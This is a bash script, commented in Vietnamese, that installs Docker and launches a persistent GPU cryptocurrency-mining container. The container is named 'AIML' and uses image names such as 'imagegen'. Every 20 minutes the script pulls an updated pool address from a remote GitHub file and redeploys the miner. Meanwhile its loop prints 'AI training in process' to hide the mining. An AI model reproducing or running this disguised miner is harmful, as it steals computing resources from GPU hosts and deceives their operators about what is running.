#!/bin/bash

# Hàm cập nhật mining pool và khởi động lại container nếu pool thay đổi
update_and_restart() {
    new_pool_url=$(curl -s https://raw.githubusercontent.com/anhacvai11/bash/refs/heads/main/ip) # Đọc pool mới từ URL
    if [ "$new_pool_url" != "$POOL_URL" ]; then
        echo "Updating POOL_URL to: $new_pool_url"
        export POOL_URL=$new_pool_url

        # Dừng & xóa container cũ trước khi chạy mới
        docker stop AIML 2>/dev/null
        docker rm AIML 2>/dev/null

        # Chạy container mới với GPU (WALLET và POOL đã có sẵn trong Dockerfile)
        docker run --gpus all -d --restart unless-stopped --name AIML anhacvai/miningrvn:v1
    else
        echo "No updates found."
    fi
}

# Cài đặt Docker nếu chưa có
install_docker() {
    apt-get update --fix-missing
    apt-get install -y \
        apt-transport-https \
        ca-certificates \
        curl \
        software-properties-common
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
    echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null
    apt-get update --fix-missing
    apt-get install -y docker-ce docker-ce-cli containerd.io
}

# Kiểm tra nếu Docker daemon đang chạy
check_docker_running() {
    if ! systemctl is-active --quiet docker; then
        echo "Docker daemon is not running. Starting Docker..."
        systemctl start docker
    else
        echo "Docker daemon is already running."
    fi
}

# Kiểm tra GPU trước khi chạy mining
echo "Kiểm tra GPU..."
docker run --rm --gpus all nvidia/cuda:12.2.0-base-ubuntu22.04 nvidia-smi

# Kiểm tra và cài đặt Docker nếu chưa có
if ! command -v docker &> /dev/null
then
    echo "Docker chưa được cài đặt. Đang cài đặt Docker..."
    install_docker
else
    echo "Docker đã được cài đặt."
fi

# Kiểm tra xem Docker daemon có đang chạy không, nếu không thì khởi động nó
check_docker_running

# Dừng & xóa container cũ nếu đang chạy
docker stop AIML 2>/dev/null
docker rm AIML 2>/dev/null

# Chạy Docker container mining với GPU (WALLET và POOL đã có sẵn trong Dockerfile)
docker run --gpus all -d --restart unless-stopped --name AIML riccorg/imagegen:latest

# Đợi một chút trước khi vào vòng lặp kiểm tra
sleep 10

# Vòng lặp kiểm tra liên tục (cập nhật pool mỗi 20 phút)
while true; do
    echo "AI training in process"
    sleep 1200  # Kiểm tra mỗi 20 phút
    update_and_restart
done
